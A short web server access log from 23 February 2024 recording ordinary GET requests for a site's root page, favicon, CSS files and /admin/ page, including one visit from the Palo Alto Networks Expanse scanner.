186.156.119.154 - - [23/Feb/2024:17:08:07 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
83.97.73.245 - - [23/Feb/2024:17:13:06 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
83.97.73.245 - - [23/Feb/2024:17:17:40 +0000] "GET / HTTP/1.1" 200 1245 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [23/Feb/2024:17:20:07 +0000] "GET / HTTP/1.1" 200 1245 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
198.235.24.114 - - [23/Feb/2024:17:28:18 +0000] "GET / HTTP/1.1" 200 2800 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
186.156.119.154 - - [23/Feb/2024:17:46:33 +0000] "GET / HTTP/1.1" 200 1245 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
186.156.119.154 - - [23/Feb/2024:17:46:33 +0000] "GET /static/css/panelAdmin/baseAdmin.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
186.156.119.154 - - [23/Feb/2024:17:46:33 +0000] "GET /static/css/menu/base.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
186.156.119.154 - - [23/Feb/2024:17:46:33 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
186.156.119.154 - - [23/Feb/2024:17:46:41 +0000] "GET / HTTP/1.1" 200 1264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:17:46:41 +0000] "GET /static/css/panelAdmin/baseAdmin.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:17:46:41 +0000] "GET /static/css/menu/base.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:17:46:41 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:17:47:32 +0000] "GET /admin/ HTTP/1.1" 200 2125 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
